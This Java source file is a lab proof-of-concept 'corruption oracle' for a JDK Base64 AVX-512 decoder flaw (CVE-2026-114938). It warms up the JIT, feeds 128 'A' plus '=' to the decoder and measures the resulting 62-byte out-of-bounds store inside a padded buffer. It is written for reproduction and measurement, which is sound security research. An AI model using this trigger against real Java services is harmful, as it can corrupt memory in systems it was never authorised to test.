import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Locale;

/**
 * j4s-oracle - corruption oracle for CVE-2026-114938.
 *
 * Lab author: eduxcode (github.com/eduxcode)
 * Trigger primitive: Quang Luong / Calif.io (public advisory CVE-2026-114938)
 *
 * What this oracle adds:
 *
 *   1. derives the trigger length that actually reaches the AVX-512 stub:
 *      the stub gate is `length > 128`, and the tail must have 1..3 bytes
 *      (length % 64 in {1,2,3}). That is why 64+'=' and 128+'=' do NOT trigger:
 *      they stay on the scalar loop. The correct trigger is 128 'A' + '=' (129 bytes).
 *   2. computes the exact store window: dp = 48 * (length / 64), 64 bytes.
 *   3. computes the buffer the JDK allocates: 3*ceil((n+1)/4) - paddings.
 *   4. validates the first/last byte and the count, instead of "something changed".
 *
 * Uses decode(byte[],byte[]) with an 8192-byte destination: the store happens at
 * the same offset, but inside the array, which allows measuring without crashing
 * the JVM.
 *
 * One trigger per JVM: the first IllegalArgumentException makes C2 deoptimize
 * decode0; later calls fall back to the scalar loop.
 */
public final class Oracle {

    static final String TOOL = "j4s-oracle";
    static final String VER = "2.0";
    static final String AUTHOR = "eduxcode";
    static final String GITHUB = "github.com/eduxcode";
    static final String UPSTREAM = "CVE-2026-114938 - Quang Luong / Calif.io";

    static final byte FILL = (byte) 0x5a;
    static final int TARGET_SIZE = 8192;
    static volatile long sink;

    static final class Result {
        int chars, inLen, bufferLen, writeStart, writeEnd, changed, first, last, oob;
        boolean rejected, hit, tailExpected;
        String note = "";
    }

    public static void main(String[] args) {
        int[] lengths = {128};   // 128 'A' + '=' = 129 bytes (length > 128, tail 1)
        int warmup = 200_000;
        boolean json = false;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--json" -> json = true;
                case "--warmup" -> warmup = Integer.parseInt(args[++i]);
                case "--lengths" -> {
                    String[] p = args[++i].split(",");
                    lengths = new int[p.length];
                    for (int k = 0; k < p.length; k++) lengths[k] = Integer.parseInt(p[k].trim());
                }
                case "-h", "--help" -> { usage(); return; }
                default -> { System.err.println("unknown argument: " + args[i]); usage(); System.exit(2); }
            }
        }

        String rt = System.getProperty("java.runtime.version");
        boolean sde = System.getenv("J4S_SDE") != null;

        if (!json) {
            System.out.println("=".repeat(70));
            System.out.printf("  %s v%s  -  Base64 corruption oracle%n", TOOL, VER);
            System.out.printf("  lab: %s (%s)%n", AUTHOR, GITHUB);
            System.out.printf("  primitive: %s%n", UPSTREAM);
            System.out.println("=".repeat(70));
            System.out.printf("  runtime : %s%n", rt);
            System.out.printf("  arch    : %s%n", System.getProperty("os.arch"));
            System.out.println(sde
                    ? "  cpu     : AVX-512 VBMI emulated (Intel SDE) -> vectorized path active"
                    : "  cpu     : direct attempt on the AVX-512 path (gate: length > 128)");
            System.out.println("-".repeat(70));
            System.out.printf("  warming up with %d decodes of 192 bytes (compiles the intrinsic)...%n", warmup);
            if (lengths.length > 1) {
                System.out.println("  WARNING: only the first trigger per JVM reaches the stub;");
                System.out.println("           use one process per length to measure several.");
            }
        }

        Base64.Decoder dec = Base64.getDecoder();
        warm(dec, warmup);

        List<Result> results = new ArrayList<>();
        for (int n : lengths) results.add(attempt(dec, n));

        boolean anyHit = results.stream().anyMatch(r -> r.hit);

        if (!json) {
            for (Result r : results) {
                String win = r.first < 0 ? "none"
                        : "[" + r.first + "," + r.last + "]";
                System.out.printf(Locale.ROOT,
                        "  [%s] %dx'A'+'='  len=%d  buffer=%d  rejected=%s%n",
                        r.hit ? "HIT" : "---", r.chars, r.inLen, r.bufferLen, r.rejected);
                System.out.printf(Locale.ROOT,
                        "        observed=%s  tail=[%d,%d]  changed=%d  OOB=%d%n",
                        win, r.writeStart, r.writeEnd, r.changed, r.oob);
            }
            System.out.println("-".repeat(70));
            if (anyHit) {
                System.out.printf("  VERDICT: CORRUPTION REPRODUCED (%d bytes past the array)%n",
                        results.stream().filter(r -> r.hit).findFirst().get().oob);
                System.out.println("           64-byte store at dp, buffer allocated by the JDK");
            } else {
                System.out.println("  VERDICT: no corruption with the tested triggers");
                System.out.println("           causes: length <= 128 (scalar loop), host without");
                System.out.println("           AVX-512 VBMI, patched runtime, or the JIT did not compile.");
            }
            System.out.println("=".repeat(70));
        } else {
            System.out.println(toJson(rt, results, anyHit));
        }

        System.exit(anyHit ? 0 : 3);
    }

    /** Runs one trigger and measures exactly where the store landed. */
    static Result attempt(Base64.Decoder dec, int chars) {
        Result r = new Result();
        r.chars = chars;
        r.inLen = chars + 1;                                   // + '='

        int len = r.inLen;
        int paddings = 0;
        if (len >= 2) { /* the trigger ends in a single '=' */ paddings = 1; }
        if (paddings == 0 && (len & 3) != 0) paddings = 4 - (len & 3);
        r.bufferLen = 3 * ((len + 3) / 4) - paddings;

        r.writeStart = 48 * (len / 64);                        // dp after the 64-byte blocks
        r.writeEnd = r.writeStart + 63;
        r.tailExpected = len > 128 && (len & 63) >= 1 && (len & 63) <= 3;
        r.oob = r.writeEnd - (r.bufferLen - 1);

        byte[] target = new byte[TARGET_SIZE];
        Arrays.fill(target, FILL);

        try {
            dec.decode(("A".repeat(chars) + "=").getBytes(StandardCharsets.US_ASCII), target);
        } catch (IllegalArgumentException expected) {
            r.rejected = true;                                 // the JDK rejects AFTER writing
        }

        int changed = 0, first = -1, last = -1;
        for (int i = 0; i < target.length; i++) {
            if (target[i] != FILL) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }
        r.changed = changed; r.first = first; r.last = last;

        r.hit = r.rejected && r.tailExpected
                && changed == r.writeEnd + 1
                && first == 0 && last == r.writeEnd
                && r.oob == 62;
        return r;
    }

    /** length > 128 so the stub picks AVX-512 (the gate is `cmpl(length,128)`). */
    static void warm(Base64.Decoder dec, int iters) {
        byte[] valid = "A".repeat(192).getBytes(StandardCharsets.US_ASCII);
        byte[] out = new byte[TARGET_SIZE];
        long acc = 0;
        for (int i = 0; i < iters; i++) acc += dec.decode(valid, out);
        sink = acc;
    }

    static String toJson(String rt, List<Result> results, boolean anyHit) {
        StringBuilder b = new StringBuilder();
        b.append("{\"tool\":\"").append(TOOL).append("\"")
         .append(",\"version\":\"").append(VER).append("\"")
         .append(",\"author\":\"").append(AUTHOR).append("\"")
         .append(",\"upstream\":\"").append(UPSTREAM).append("\"")
         .append(",\"runtime\":\"").append(rt).append("\"")
         .append(",\"results\":[");
        for (int i = 0; i < results.size(); i++) {
            Result r = results.get(i);
            if (i > 0) b.append(',');
            b.append("{\"trigger\":").append(r.chars)
             .append(",\"in_len\":").append(r.inLen)
             .append(",\"buffer_len\":").append(r.bufferLen)
             .append(",\"write_start\":").append(r.writeStart)
             .append(",\"write_end\":").append(r.writeEnd)
             .append(",\"rejected\":").append(r.rejected)
             .append(",\"changed\":").append(r.changed)
             .append(",\"first\":").append(r.first)
             .append(",\"last\":").append(r.last)
             .append(",\"oob\":").append(r.oob)
             .append(",\"hit\":").append(r.hit).append('}');
        }
        b.append("],\"verdict\":\"").append(anyHit ? "CORRUPTED" : "NO_WRITE")
         .append("\"}");
        return b.toString();
    }

    static void usage() {
        System.out.println("""
            usage: java Oracle [--lengths 129] [--warmup N] [--json]

              --lengths  number of 'A' before the '=' (default 128 -> 129 bytes)
              --warmup   warmup iterations (default 200000)
              --json     machine-readable output

            one trigger per JVM. exit: 0 = corruption | 3 = not reproduced | 2 = error
            """);
    }
}
